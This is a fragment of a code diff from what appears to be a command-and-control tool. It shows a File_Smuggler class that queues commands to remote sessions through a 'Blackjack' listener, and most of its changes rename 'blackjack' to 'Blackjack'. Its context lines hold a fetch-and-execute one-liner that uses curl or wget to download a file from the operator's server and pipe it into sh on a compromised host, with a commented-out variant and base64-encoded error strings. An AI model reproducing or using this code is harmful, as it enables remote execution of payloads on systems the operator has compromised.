+        print(f'[{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{ORANGE}{File_Smuggler_Settings.bind_port}{END}]::{self.server_name}\n')
 
 
 
@@ -3212,14 +3213,14 @@ class File_Smuggler:
             if Sessions_Manager.active_sessions[session_id]['Listener'] == 'blackjack' and issuer != 'self':
                 request_file_cmd = request_file_cmd + Exec_Utils.get_sibling_signature(session_id, signature = issuer)
 
-            # Construct blackjack issued command to request file
+            # Construct Blackjack issued command to request file
             blackjack_cmd = {
                 'data' : request_file_cmd,
                 'issuer' : issuer,
                 'quiet' : False
             }
 
-            blackjack.command_pool[session_id].append(blackjack_cmd)
+            Blackjack.command_pool[session_id].append(blackjack_cmd)
 
         except:
             File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Upload function failed.')
@@ -3250,14 +3251,14 @@ class File_Smuggler:
                 #exec_file_cmd = f'url="http://{server_ip}:{port}/{ticket}"&&(command -v curl&&(curl -s $url | sh)||((command -v wget&&wget -q $url | sh)||echo TmVpdGhlciBjVVJMIG5vciBXZ2V0IHNlZW0gdG8gYmUgaW4gJFBBVEguCg== | base64 -d))'
                 exec_file_cmd = f'url="http://{server_ip}:{port}/{ticket}";curl -s $url | sh 2>&1 || wget -q $url | sh 2>&1 || echo Q29tbWFuZDo6RXJyb3IK | base64 -d'
 
-            # Construct blackjack issued command to request file
+            # Construct Blackjack issued command to request file
             blackjack_cmd = {
                 'data' : exec_file_cmd,
                 'issuer' : issuer,
                 'quiet' : False if issuer == 'self' else True
             }
 
-            blackjack.command_pool[session_id].append(blackjack_cmd)
+            Blackjack.command_pool[session_id].append(blackjack_cmd)
 
         except:
             File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Exec function failed.')
@@ -3278,8 +3279,8 @@ class File_Smuggler:
 # Global Prompt restoration functions
 def restore_prompt():
 
-    if blackjack.active_shell:
-        blackjack.rst_shell_prompt() if blackjack.prompt_ready else blackjack.set_shell_prompt_ready()
+    if Blackjack.active_shell:
+        Blackjack.rst_shell_prompt() if Blackjack.prompt_ready else Blackjack.set_shell_prompt_ready()
 
     else:
         Main_prompt.rst_prompt() if Main_prompt.ready else Main_prompt.set_main_prompt_ready()
